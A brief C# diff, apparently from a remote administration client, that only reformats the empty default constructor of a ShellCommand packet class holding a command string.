@@ -8,7 +8,10 @@ namespace xClient.Core.Packets.ServerPackets
         [ProtoMember(1)]
         public string Command { get; set; }
 
-        public ShellCommand() { }
+        public ShellCommand()
+        {
+        }
+
         public ShellCommand(string command)
         {
             this.Command = command;
